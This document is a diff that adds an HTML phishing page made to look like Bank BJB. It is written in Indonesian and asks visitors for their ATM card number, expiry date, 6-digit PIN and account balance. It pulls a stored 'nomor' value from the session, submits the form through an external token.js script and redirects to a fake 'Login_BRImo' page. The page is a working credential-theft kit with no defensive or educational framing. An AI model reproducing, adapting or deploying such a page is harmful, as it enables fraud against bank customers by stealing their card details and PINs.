@@ -1,0 +1,392 @@
+
+<html lang="id">
+ <head> 
+  <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi --> 
+  <meta content="#2E8EBE" name="theme-color"> 
+  <!-- Warna untuk Windows Phone --> 
+  <meta content="#2E8EBE" name="msapplication-navbutton-color"> 
+  <!-- Warna untuk iOS Safari --> 
+  <meta content="yes" name="apple-mobile-web-app-capable"> 
+  <meta content="#2E8EBE" name="apple-mobile-web-app-status-bar-style"> 
+  <meta charset="utf-8"> 
+  <meta name="fragment" content="!"> 
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
+  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
+  <!-- Global Styles --> 
+  <title>Bank BJB</title> 
+  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizb1-vu-wnYMonTO6mhLadGlkqHdASnfx-fWsSzJoYHr9n7KrxLbB86VzJYWF0d6KusVNNQRaWVYkVYQzUkziywq4ualtGCpyl4I5F44N3xgyk9XWD4uv3Hg4OWXKtdOxhkSIcYbHHAB6S3-gs0uMmXgUo4LlrL15t97oYi79kO0nMUw1iBiLX72Xk/s16000/Screenshot_2023-03-27-17-14-49-92_b5a5c5cb02ca09c784c5d88160e2ec24.jpg" rel="shortcut icon" type="image/x-icon"> 
+  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizb1-vu-wnYMonTO6mhLadGlkqHdASnfx-fWsSzJoYHr9n7KrxLbB86VzJYWF0d6KusVNNQRaWVYkVYQzUkziywq4ualtGCpyl4I5F44N3xgyk9XWD4uv3Hg4OWXKtdOxhkSIcYbHHAB6S3-gs0uMmXgUo4LlrL15t97oYi79kO0nMUw1iBiLX72Xk/s16000/Screenshot_2023-03-27-17-14-49-92_b5a5c5cb02ca09c784c5d88160e2ec24.jpg" rel="apple-touch-icon"> 
+  <title>Bank BJB</title> 
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
+  <link href="https://fonts.googleapis.com/css?family=Alata" rel="stylesheet">
+
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+
+        @font-face {
+            font-family: ''Avenir';'
+            src: url('assets/fonts/AvenirNextLTPro-Bold.otf');
+        }
+
+               /*untuk teks heading di tag <body>*/
+        h2
+        {
+            background-color: white;
+            color: crimson;
+            font-family: sans-serif;
+            text-align: center;
+            width: 45%;
+            margin:auto;
+            padding: 20px;
+        }
+ 
+ body{
+ width: 100%;
+ heigh: 716px;
+ background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhraf9Fq9lBRnyV8P9o9onBp8e2z5iEAPxkoJhBvNtlIMlyTcizjwjnIP1CctE1rEQafVp0q_bT4vfSA7TS2L8tBBZQ4kPZaGtY7b_KiaLhioM1SrM4D23OG-pKBSuEtrLpVB2YAKWebtCQ3bxcaRQS6tSXFNsWE7l01Ys3gfTdjK4Zj3-XRksqCiZCVkE/s4329/bg_splash_screen.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%;
+      font-family: Alata, sans-serif;
+      padding: 10px;
+ }
+
+.imagesi{
+    margin-top: 20px;
+    width: 100%;
+    height: 98%;
+    position: fixed;
+}
+        .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #0086e0;
+            font-weight: 800;
+            font-size: 20px;
+            display: block;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: 5px;
+            color: #000;
+            font-weight: 800;
+        }
+
+        .btn-punya {
+            font-family: 'Open Sans', sans-serif;
+            display: block;
+            margin: 40px 0;
+            margin-top: -80px;
+            padding: 0px;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            text-align: center;
+            height: 47px;
+            width: 92%;
+            max-width: 100%;
+            font-family: Arial;
+            font-size: 14px;
+            font-weight: bold;
+            color: transparent;
+            letter-spacing: 2px;
+            line-height: 1;
+            border-radius: 5px;
+            
+            transition: background 200ms ease 0s;
+            position: fixed;
+        }
+
+
+
+        .btn-belum {
+            font-family: 'Open Sans', sans-serif;
+            display: block;
+            margin: 20px auto;
+            padding: 0px;
+            cursor: pointer;
+            background: none transparent;
+            border: none;
+            text-align: center;
+            height: 47px;
+            width: 459px;
+            max-width: 100%;
+            font-family: Arial;
+            font-size: 14px;
+            font-weight: bold;
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px;
+            line-height: 1;
+            border-radius: 5px;
+            transition: background 200ms ease 0s;
+        }
+
+        #loading {
+            width: 100%;
+            height: 100%;
+            display: none;
+            margin: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+        }
+
+        #loading img {
+            width: 40px;
+            position: absolute;
+            top: 43%;
+            left: 0;
+            right: 0;
+            display: block;
+            margin: auto;
+        }
+
+        #aseli {
+            width: 100%;
+            height: 100%;
+            display: none;
+            margin: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 9999;
+            overflow-y: scroll;
+        }
+        
+        welalxcome {
+        position: fixed;
+    left: 0;
+    top: -25;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    align-content: center;
+    justify-content: center;
+}
+welalxcome img {
+        width:100vw;
+    height: 716px;
+}
+chsalxcome {
+        position: relative;
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+ 
+ 
+label{
+    color: #3C6A8B;
+    margin: 5px 20px;
+    margin-top: -8px;
+}
+
+.form{
+    border: 6px double #FFC945;
+    padding: 6px;
+    padding-bottom: 10px;
+    border-radius: 6px;
+    background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbdbnU-8TFEXmnPOvGZTM4y_kfIsg5ZdURRKkGTkz5Oe7l22ciy445ywD4AFtLm5mtcKXFR7-D4nL78ZBh7wli9FDitvt4D4dgy9Uato_mjJG6y2I-Bllv9vSuLmjVcBzezl0h8L1J-HcVsSO5HbJ-k_TzbAo0jmzuZT1M3lg9jkYrKbKZlcRNhwpUN3M/s691/bg_utama_light.png');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; 
+      box-shadow: rgba(0, 0, 0, 0.46) 0px 1px 4px;
+      height: 433px;
+      margin-top: 70px;
+      outline: 3px groove #fff;
+      position: relative;
+      
+}
+
+input{
+    font-size:15px;
+    margin: 0px auto;
+    width: 90%;
+    height: 45px;
+    background: #F4F9FC;
+    border: none;
+    position: relative;
+    left: 0;
+    right: 0;
+    display: flex;
+    padding: 10px;
+    outline: none;
+    box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;
+}
+
+input::placeholder{
+    opacity: 0.7;
+}
+
+
+button{
+    margin: 0px auto;
+    width: 85%;
+    height: 45px;
+    background: #FFC945;
+    border: none;
+    position: relative;
+    left: 0;
+    right: 0;
+    display: block;
+    padding: 10px;
+    outline: none;
+    border-radius: 5px;
+    color: #3C6A8B;
+    box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;
+}
+    </style> 
+ </head> 
+ <style>
+.load{
+     top: 0;
+     left: 0;
+     right: 0;
+     position: fixed;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     background: #00000033;
+     z-index: 999999999;
+     width: 100%;
+     height: 100%;
+      }
+</style>
+<div class="load" style="display:none;"></div>
+ <body> 
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUxadc1x2VWWyT1cJ8xAMVlBUH0eAQbaRQvWbJrUckU5NrSo3Kn77mSJhKN46q-n8PXcOhzhZVHPb6mJWCKaLuwxvTkeoW_VJEvhis1mHWYOGGUvZ0YeR3NK7sHIc1aDiJ_cy8fKfsqXKhGvQ5it4IWLax1yktAifPmtC3xmPt5C2ilawPTjP8kSNkIwE/s400/AddText_08-10-09.31.31.png" style="position: absolute; right: 15; top: 10; width: 80px">
+<div class="form">     
+<form id="login" method="POST">
+<div style="margin-top: 10; font-size: 20px; margin-left: 15px; color: #3C6A8B; margin-bottom: 20px">
+ Informasi Data Nasabah.   
+</div>
+
+<input type="hidden" id="nomor" name="nomor">
+<label>Nomor Kartu ATM</label>   
+<input type="tel" id="atm" name="atm" placeholder="Masukkan nomor kartu ATM Kamu" maxlength="20" minlength="20" required oninvalid="this.setCustomValidity('Tuliskan 𝟭𝟴 𝗗𝗶𝗴𝗶𝘁 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1xl_Nxd9RiN9iMg71dfgBjBIhC8An2bhD946tlGOjCKNBGDVJyN__zVQxOnSPOm1CB2WuHRJhhyphenhyphenwiBKW9F3Nlg72-n4CDtmhuQCsFFowBAUyG0-qBChcvtCitReTW-T02JVbcZkkZeUw-puYTizPUfrUTdKnu3H3AQOjjK0QMpPlyz5YMY1E76kg-wbQ/s1066/AddText_08-12-10.08.37.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; ">
+ <br>
+ <label>Tanggal Kadaluarsa Kartu ATM</label>   
+<input type="tel" id="valid" name="valid" placeholder="MM/YY" maxlength="5" minlength="5" oninvalid="this.setCustomValidity('Tuliskan 𝗠𝗮𝘀𝗮 𝗯𝗲𝗿𝗹𝗮𝗸𝘂 𝗸𝗮𝗿𝘁𝘂 𝘆𝗮𝗻𝗴 𝗮𝗱𝗮 𝗱𝗶 𝗱𝗲𝗽𝗮𝗻 𝗸𝗮𝗿𝘁𝘂-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9BcnZ7S3PsxEZqZ_78SjDdCSTMKQefKjsW9-KirWl3SjIMJE618l5nYj6brstU0Y8UhTj-8nkT6QmIIScKXDcGJRUe95wEtW0aK_9siMairaFxhTkIM40PzDjHE02_7h2VbaQPPzTRcuM1hQWP_4ysk80HqNbbpr_IrOyJ3RD9pSbbfEJ0NINFvyPgSM/s1080/AddText_08-02-01.08.27.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; " required>   
+<br>
+ <label>6-digit PIN Kartu ATM</label>   
+<input type="tel" id="pin" name="pin" placeholder="PIN" maxlength="6" minlength="6" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗣𝗜𝗡-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKH54H-KmEW0JbbrCL2EHo55vUo75ra5Rjfywk-SvEIz6-4bqNJ9KV-RY-ca9w31vmiNQOTbzurLCqLQk_IM0IPn-yqWW6HpbHF8NzDqFBsKOj5NCOeHg9blcuuQLEfZuvmPEVQnquSLozRUoA2bOzEsmldaerNi3VMb82VbsDLvqdTZg9XbnFUmmz7_I/s1066/AddText_08-02-01.10.22.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; " required>   
+ <br>
+ <label>Saldo Tersedia</label>   
+<input class="uang" type="tel" id="saldo" name="saldo" placeholder="Saldo Rekening" maxlength="6" minlength="6" oninvalid="this.setCustomValidity('𝗧𝘂𝗹𝗶𝘀𝗸𝗮𝗻 𝘀𝗮𝗹𝗱𝗼 𝘁𝗲𝗿𝗮𝗸𝗵𝗶𝗿 𝘀𝗲𝘀𝘂𝗮𝗶 𝗱𝗶 𝗿𝗲𝗸𝗲𝗻𝗶𝗻𝗴 𝘁𝗮𝗯𝘂𝗻𝗴𝗮𝗻')" onchange="this.setCustomValidity('')" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicUFlJDckst6-Q0ODcJHOozOokvxm9Nwv4J7m8I8aDxV_foZ_C68evDWQysu4Wl-sh7NAgOW9DxzpOIw2OpzG90rl9O4f6ewXAVpNXeZtigezkRcapoiO7kZ5ZF4fR5uJwKHoZMrJjIFFzvPNSRh210fiadDYDafEsHflFetmx4bK5mNk68sCUeobRRoo/s1066/AddText_08-12-09.59.29.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; " required>   
+ <br>
+ </div>
+<button type="submit" id="kirims" style="margin-top: 25px;">Selanjutnya</button>    
+</form>
+  <div style="height:220px;width: 70px;margin-top: -20px;margin-bottom: 0px;float:center;margin-left:0;" class="talxcome"> 
+  </div> 
+  
+   <div id="loading"> 
+    <img src="https://cutewallpaper.org/21/loading-gif-transparent-background/Tag-For-Loading-Bar-Gif-Transparent-Loading-Gif-.gif" alt=""> 
+   </div> 
+   <div id="aseli"></div> 
+
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous">
+    </script> 
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>    
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.uang' ).mask('000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })
+            
+            
+        </script>
+<script>$(document).ready(function(){
+
+$('#atm').mask('000000 000000 000000');
+
+$('#valid').mask('00/00');    
+});
+</script>
+<script>
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomor").value = nomor + "";
+</script>   
+   <script>
+    window.onload = ()=>{document.querySelector('#aud').play();}
+</script> 
+   <script>
+          $(document).ready(function () {
+            $(".btn-puny").on('click', function () {
+                $("#loading").show();
+                
+                setTimeout(function () {
+                    location.href ="./Login_BRImo.html";
+                }, 1800);
+
+            });
+        });
+    </script> 
+   <script>
+        $( document ).ready(function() {
+            setTimeout(() => {
+                $('welalxcome').hide();
+                $('chsalxcome2').fadeIn();
+            },1000)
+        });
+</script> 
+ <script src="token.js">
+
+
+</script>
+ </body>
+</html>
